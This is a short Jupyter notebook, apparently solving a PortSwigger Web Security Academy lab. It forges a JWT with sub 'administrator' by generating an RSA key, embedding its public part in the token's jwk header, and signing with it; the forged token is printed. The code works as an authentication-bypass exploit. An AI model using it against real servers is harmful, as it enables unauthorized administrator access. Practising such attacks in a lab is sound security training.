{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Inject self-signed JWT via jwk header parameter.\n",
    "Seems like the least amount of work to implement this attack from building blocks in jwcrypto.\n",
    "\n",
    "See https://portswigger.net/web-security/jwt."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from jwcrypto import jwt, jwk\n",
    "import uuid"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'31bf81b8-ca5c-11ed-9712-6045bd7ea403'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "kid = str(uuid.uuid1())\n",
    "kid"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "key = jwk.JWK.generate(kty=\"RSA\", size=2048, kid=kid)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'kid': '31bf81b8-ca5c-11ed-9712-6045bd7ea403',\n",
       " 'alg': 'RS256',\n",
       " 'jwk': {'kty': 'RSA',\n",
       "  'kid': '31bf81b8-ca5c-11ed-9712-6045bd7ea403',\n",
       "  'n': '3WUO6sH2_ePoie2_QmY9cTVBTsT0oOINUY3HCV_JVhVoU6GaAX9FnzcrOe4sO1a5i1IYmhlysmIP158jZz2p0TfnEjQCjTIVk3-yvDdDrLd0j9PeMkC_QFyr36KCh3Jc8Z7tO2eo5tuxfUeVogjDzPZJbuNCYJcKlSPFISxU83CcS9HMBs-GfI8mcK3cFB6w-KdUCiAiRbXnea5NyZJssaZegjjmWEqjKIl-2lo3ZEszBkH46z8X0xKuK2N1gbONxZynspUXEjod1cENEqZTdOlJcpaDx3OTi11GiG-smzDWX6PYlezsHX4qCZsYzDPQY-wLabzK1kUdKwKzkXvEnw',\n",
       "  'e': 'AQAB'}}"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "header = {\n",
    "    \"kid\": kid,\n",
    "    \"alg\": \"RS256\",\n",
    "    \"jwk\": key.export_public(as_dict=True)\n",
    "}\n",
    "header"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "claims = {\n",
    "    \"iss\": \"portswigger\",\n",
    "    \"sub\": \"administrator\",\n",
    "    \"exp\": 1679676620,\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "token = jwt.JWT(header=header, claims=claims)\n",
    "token.make_signed_token(key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImtpZCI6IjMxYmY4MWI4LWNhNWMtMTFlZC05NzEyLTYwNDViZDdlYTQwMyIsImt0eSI6IlJTQSIsIm4iOiIzV1VPNnNIMl9lUG9pZTJfUW1ZOWNUVkJUc1Qwb09JTlVZM0hDVl9KVmhWb1U2R2FBWDlGbnpjck9lNHNPMWE1aTFJWW1obHlzbUlQMTU4alp6MnAwVGZuRWpRQ2pUSVZrMy15dkRkRHJMZDBqOVBlTWtDX1FGeXIzNktDaDNKYzhaN3RPMmVvNXR1eGZVZVZvZ2pEelBaSmJ1TkNZSmNLbFNQRklTeFU4M0NjUzlITUJzLUdmSThtY0szY0ZCNnctS2RVQ2lBaVJiWG5lYTVOeVpKc3NhWmVnamptV0VxaktJbC0ybG8zWkVzekJrSDQ2ejhYMHhLdUsyTjFnYk9OeFp5bnNwVVhFam9kMWNFTkVxWlRkT2xKY3BhRHgzT1RpMTFHaUctc216RFdYNlBZbGV6c0hYNHFDWnNZekRQUVktd0xhYnpLMWtVZEt3S3prWHZFbncifSwia2lkIjoiMzFiZjgxYjgtY2E1Yy0xMWVkLTk3MTItNjA0NWJkN2VhNDAzIn0.eyJleHAiOjE2Nzk2NzY2MjAsImlzcyI6InBvcnRzd2lnZ2VyIiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.KSV-RWP8IHHWYJFHHiuR87_QEzSxDUfNv3jIXLjHgnMHK4pqpL16A7nv-dwqIj-iIZzevyyFz3UcApFlfpWJbQjG7OzDaMOv7PaKa6Y61YaamJwMb94JIiGhN1LcKhhHcCwNH7FlM2bTJcxVE-zrxlINxpMlhBLyd0VfxzyHKLtHYX1_Fe_HfkMosvGh9rGifIBfQtQylrDMh0ilvxDAosz1brNYslcXBQGBVMFwgNaE6QgaHqx984eXNDNWPrli_dHu7eEc9663x1Byl7hgMj1NzpBj_J4hjbObQPyL-rm4hj9dGoEYyqSiMI5ABZFyFIAqOfebo1T3uYeJcw_59g'"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "token.serialize()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
